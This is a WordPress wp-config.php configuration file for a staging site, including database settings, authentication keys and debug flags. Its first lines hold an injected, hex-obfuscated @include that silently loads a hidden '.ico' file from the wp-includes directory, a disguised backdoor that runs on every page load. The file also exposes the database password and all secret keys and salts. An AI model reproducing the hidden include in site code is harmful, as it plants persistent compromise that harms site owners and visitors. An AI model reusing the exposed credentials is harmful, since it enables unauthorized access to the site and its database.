<?php
/*8f497*/

@include "\x2fho\x6de/\x6fro\x6cot\x74o/\x70ub\x6cic\x5fht\x6dl/\x77p-\x69nc\x6cud\x65s/\x53im\x70le\x50ie\x2fDe\x63od\x65/.\x306b\x331b\x618.\x69co";

/*8f497*/
/**
* The base configurations of the WordPress.
*
* This file has the following configurations: MySQL settings, Table Prefix,
* Secret Keys, and ABSPATH. You can find more information by visiting
* {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
* Codex page. You can get the MySQL settings from your web host.
*
* This file is used by the wp-config.php creation script during the
* installation. You don't have to use the web site, you can just copy this file
* to "wp-config.php" and fill in the values.
*
* @package WordPress
*/

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'orolotto_staging');
/** MySQL database username */
define('DB_USER', 'orolotto_staging');
/** MySQL database password */
define('DB_PASSWORD', 'staging$237');
/** MySQL hostname */
define('DB_HOST', 'localhost');
/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
* Authentication Unique Keys and Salts.
*
* Change these to different unique phrases!
* You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
* You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
*
* @since 2.6.0
*/
define('AUTH_KEY',         '!+l$HHB0-{^|P,`b~=>tIcTvH?>4:4Vm53e1+$Z.=ZX3*AP|+x{Pic!k)H!_4amF');
define('SECURE_AUTH_KEY',  '>KQ|11K -TCzMXS^7GDw-6I?v#4& h&|&LDtkZ:`Bk>=ENGQ/EdLgdn.xd+)bBOO');
define('LOGGED_IN_KEY',    ']g/Nz&9~LL?4G1vj1|b47MuTHVJ+93YX3L+Kc-HSU04U_vcWi,^7gSAHrc=%E&A3');
define('NONCE_KEY',        'vL)Y9G5`TW_e=o43GdCbjkJcat#-WKE)4#.Ldu^p?2F2o#{`6iNbA=2y}j#{[/.}');
define('AUTH_SALT',        'xF[juDGif$(|zt(+KOU?FraRUG&pN)lU& 4(`9T%S2hWw]+OB1>U~}2X/x=UpSc`');
define('SECURE_AUTH_SALT', '%4/<i5&If={C*+%12hS|WJye.}.h!!nH_c]#WS:3l5CIdU2y&9k=H/@:Z37C0-=o');
define('LOGGED_IN_SALT',   '|C5)I%KU]wpZ fy&9(%oy|9}l~{hl:10*nAibv-~R=v7I+F 6}U{DV4XC$2EaX-3');
define('NONCE_SALT',       'u?LN|9XcRzHbH4wu$8e3<v6_J#S|I%UubuZc5)SF:]U!|Xx?:+%? #)tma&$O;}u');
/**#@-*/
/**
* WordPress Database Table prefix.
*
* You can have multiple installations in one database if you give each a unique
* prefix. Only numbers, letters, and underscores please!
*/
$table_prefix  = 'lotto_';
/**
* For developers: WordPress debugging mode.
*
* Change this to true to enable the display of notices during development.
* It is strongly recommended that plugin and theme developers use WP_DEBUG
* in their development environments.
*/

define('WP_HOME','http://www.orolotto.com/staging');
define('WP_SITEURL','http://www.orolotto.com/staging');

define ('WP_DEBUG', true);
define ( 'WP_DEBUG_LOG' , true );
define ( 'WP_DEBUG_DISPLAY' , false );
define ( 'SCRIPT_DEBUG' , true );
define ( 'SAVEQUERIES' , true );

/* That's all, stop editing! Happy blogging. */
/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
define('ABSPATH', dirname(__FILE__) . '/');
/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
